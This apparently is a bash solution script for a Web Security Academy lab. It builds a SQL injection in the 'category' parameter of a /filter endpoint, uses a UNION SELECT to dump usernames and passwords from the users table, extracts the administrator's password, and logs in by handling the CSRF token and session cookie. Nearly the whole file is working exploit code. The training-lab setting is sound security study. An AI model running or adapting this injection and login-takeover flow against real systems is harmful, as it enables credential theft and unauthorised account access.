#!/bin/bash

#setup
if [[ ${#1} -ne 32 ]]; then
	echo "USAGE: $0 subdomain"
	exit 1;
fi
url="https://$1.web-security-academy.net"

# Injection method - category is improperly sanetized
inject() {
	curl \
			-s \
			-G "$url/filter" \
			--data-urlencode "category=Gifts$1"
}

session() {
	response="$1";
	echo "$response" | grep '< Set-Cookie: session=' | cut -d'=' -f2 | cut -d';' -f1
}

login() {
	username="$1";
	password="$2";
	csrfResponse=$(curl -v -sG "$url/login" 2>&1);
	csrf=$(
		echo "$csrfResponse" |
		grep csrf |
		grep -Eo 'value=".+?"' |
		cut -d'"' -f2
	);
	
	session=$(session "$csrfResponse");
	redirectResponse=$(
		curl -v "$url/login" \
		--cookie "session=$session;" \
		--data-raw "csrf=$csrf&username=$targetUser&password=$password" 2>&1
	);

	# Redirect to /my-account
	session=$(session "$redirectResponse");
	echo "$redirectResponse";
	curl -v "$url/my-account" \
		--cookie "session=$session;"
}

# Core logic
targetUser="administrator";
credentials=$(inject "' AND 1=0 UNION SELECT null, CONCAT(username, ':', password) FROM users --");
password=$(echo "$credentials" | grep "$targetUser" | cut -d':' -f2 | cut -d'<' -f1)

# Complete the lab
login "$targetUser" "$password"